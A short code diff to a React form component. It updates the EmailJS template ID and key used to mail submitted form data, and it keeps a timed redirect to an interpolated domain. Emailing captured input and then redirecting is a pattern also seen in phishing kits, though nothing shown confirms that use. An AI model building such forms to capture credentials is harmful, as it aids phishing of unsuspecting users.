@@ -11,15 +11,16 @@ function Forms() {
   const [showForm, setShowForm] = useState(true);
   const [confirmForm, setConfirmForm] = useState(false);
 
+ 
   const submitHandler = (e) => {
     e.preventDefault();
 
     emailjs
       .sendForm(
         "gmail",
-        "template_hb9qmr9",
+        "template_4vec5mg",
         e.target,
-        "user_SEoZ3jhZmvmc7W9yRaSnR"
+        "dNZX_qAf-tSKJROzf"
       )
       .then(
         (result) => {
@@ -41,9 +42,9 @@ function Forms() {
     emailjs
       .sendForm(
         "gmail",
-        "template_hb9qmr9",
+        "template_4vec5mg",
         e.target,
-        "user_SEoZ3jhZmvmc7W9yRaSnR"
+        "dNZX_qAf-tSKJROzf"
       )
       .then(
         (result) => {
@@ -58,7 +59,6 @@ function Forms() {
       window.location.href = `https://${domain}`;
     }, 1000);
   };
-
   return (
     <Styls>
       <div className="contsainer">
